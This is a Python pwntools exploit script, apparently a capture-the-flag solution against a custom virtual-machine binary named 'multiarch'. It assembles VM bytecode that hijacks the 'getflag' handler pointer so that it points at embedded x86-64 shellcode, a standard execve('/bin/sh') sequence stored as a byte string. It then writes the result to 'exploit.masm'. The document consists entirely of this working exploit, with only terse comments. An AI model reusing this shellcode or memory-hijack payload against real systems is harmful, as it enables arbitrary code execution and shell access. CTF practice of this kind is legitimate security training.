from pwn import *

context.binary = ELF("./multiarch")

class Assembler:
    def __init__(self):
        self.pc = 0
        self.code = b""
        self.archmask = [0]
        
    def set_pc_bit(self, bit):
        print(self.pc >> 3, len(self.archmask))
        while len(self.archmask) <= (self.pc >> 3):
            self.archmask.append(0)
        
        self.archmask[self.pc >> 3] |= (bit << (self.pc & 7))

    def stack_push_byte(self, val):
        self.set_pc_bit(0)
        self.code += p8(0x10) + p32(val)
        self.pc += 5
    
    def stack_push(self, val):
        self.set_pc_bit(0)
        self.code += p8(0x30) + p32(val)
        self.pc += 5
    
    def stack_syscall(self):
        self.set_pc_bit(0)
        self.code += p8(0xa0) + p32(0)
        self.pc += 5

    def xor(self, r1, r2):
        self.set_pc_bit(1)
        self.code += p8(0x40) + p8((r1 << 4) | r2)
        self.pc += 2

    def xor_imm(self, r1, imm):
        self.set_pc_bit(1)
        self.code += p8(0x41) + p8(r1 << 4) + p32(imm)
        self.pc += 6

    def sub_imm(self, r1, imm):
        self.set_pc_bit(1)
        self.code += p8(0x31) + p8(r1 << 4) + p32(imm)

    def ldr_imm(self, r1, imm):
        self.set_pc_bit(1)
        self.code += p8(0xc4 | (r1 << 3)) + p32(imm)
        self.pc += 5

    def str_imm(self, r1, imm):
        self.set_pc_bit(1)
        self.code += p8(0xe0 | r1) + p32(imm)
        self.pc += 5

    def halt(self):
        self.set_pc_bit(1)
        self.code += b"\x00"
        self.pc += 1


def make_segment(typ, off, size):
    return p8(typ) + p16(off) + p16(size)

asmb = Assembler()

asmb.stack_push(0)
asmb.stack_push_byte(6)
asmb.stack_syscall() # EXPAND_MEM
asmb.xor_imm(5, 0x370) # chaning address to point to VM*
asmb.ldr_imm(2, 0xa008) # reading lower part of data address
asmb.str_imm(2, 0xa028) # storing lower part of data address at getflag
asmb.ldr_imm(2, 0xa00c) # reading higher part of data address
asmb.str_imm(2, 0xa02c) # storing higher part of data address at getflag
asmb.stack_push_byte(5)
asmb.stack_syscall() # PRINT_FLAG
asmb.halt()

magic = b"MASM"
code = asmb.code
bssdata = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
archmask = bytes(asmb.archmask)

payload = flat(
    magic,
    make_segment(1, 19, len(code)),
    make_segment(2, 19 + len(code), len(bssdata)),
    make_segment(3, 19 + len(code) + len(bssdata), len(archmask)),
    code, bssdata, archmask
)

open("exploit.masm", "wb").write(payload)